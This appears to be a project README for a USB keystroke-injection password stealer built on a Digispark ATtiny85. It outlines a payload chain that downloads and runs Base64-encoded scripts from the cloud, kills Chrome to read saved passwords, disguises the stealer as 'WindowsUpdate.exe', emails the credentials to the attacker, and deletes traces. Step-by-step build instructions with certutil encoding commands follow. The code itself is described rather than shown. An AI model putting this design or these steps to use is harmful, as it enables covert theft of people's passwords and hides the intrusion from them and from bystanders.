# ATtinyPasswordSwiper

 This project demonstrates how USB keyboard emulation can be exploited for malicious purposes using the Digispark ATtiny85 development board.
 
![](https://cdn.instructables.com/FKP/MAA2/HH2VJNW1/FKPMAA2HH2VJNW1.SMALL.jpg)
 
 Objectives: 
 Minimize time for attacker to keep device plugged in
 Fit initial exploit code onto limited flash memory on ATtiny85
 Leave no traces behind after victim has been pwned
 
 Software:
 
### payload.ino
* AtTiny84 emulates keyboard
* Uses WINDOWS + R shortcut to open run prompt and open cmd and powershell
* Connects to attackers wifi hotspot to bypass potential browsing restrictions
* Uses powershell to download and decode Base64 encoded file stored in cloud
* Runs decoded file (orion.bat)
* Turns on LED on ATtiny so attacker knows to unplug and skrrt

### orion.bat
* Attack continues after attacker leaves
* Writes and runs powershell script to download WindowsUpdate.exe from cloud
* Opens Microsoft Edge to hide ghost code execution from bystanders
* Decodes WindowsUpdate.exe from Base64
* Kills Chrome process so databases can be read
* Runs WindowsUpdate.exe
* deletes all files created previously to hide traces of tampering

### WindowsUpdate.py
* Uses chromepass https://github.com/hassaanaliw/chromepass to siphon passwords from Google Chrome. 
* Uses MIME library to email passwords to attacker securely

 

 
 
 
 
 
 Compiling Instructions:
 1. Update WindowsUpdate.py with valid email credentials.
 2. Use py2exe to compile into exe file (since most Windows PCs don't come with Python).
 3. In command prompt run: certutil -encode WindowsUpdate.exe "certification.txt"
 4. Upload certification.txt to cloud and replace link in orion.bat
 5. In command prompt run: certutil -encode orion.bat "emerald.txt"
 6. Upload emerald.txt to cloud and replace link in payload.ino
 7. Compile and upload payload.ino to ATtiny Device using Arduino IDE
 
